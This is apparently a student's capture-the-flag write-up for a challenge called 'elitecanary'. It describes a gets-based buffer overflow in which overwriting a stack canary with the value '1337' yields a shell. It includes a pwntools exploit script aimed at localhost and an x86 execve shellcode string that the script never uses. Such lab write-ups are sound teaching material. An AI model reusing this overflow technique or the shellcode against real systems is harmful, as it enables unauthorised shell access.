ref: 4 | Canary 1 | elitecanary
===========================

General overview of problems faced
-------------------------------------
- Learned what a canary was and why it was used
- Started using IDA in order to facilitate the reverse engineering process

List of vulnerabilities
--------------------
1. The buffer is of fixed length and the program uses 'gets' to take input from the user. Therefore a buffer overflow is possible. The program has buffer overflow mitigation (aka a canary) which is loaded after the buffer in memory and checked at the end to make sure the user has not overflown the buffer and modified the canary.
In this particular case, by reverse engineering the program we can see that if the canary is equal to "1337", the program will give you a shell. Hence, we are able to overflow the buffer and overwrite the canary to be equal to "1337".

Steps to exploit
------------------
1. Use objdump, IDA or otherwise to the extract the requested value for the canary ("1337" in this case)
2. Send 32 bytes to the input and then "1337" to overwrite the current canary
3. Congratulations! You now have a shell!

Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

NOP_OPERATOR = '\x90'
SHELLCODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

LEN_SHELL = len(SHELLCODE)

def main():
    target = "localhost"
    port = "6001"

    buf_len = 32 # length of input buffer

    canary = "1337"

    r = remote( target, port )

    r.sendline( "A" * buf_len + canary )

    r.interactive()

if __name__ == '__main__':
    main()
```
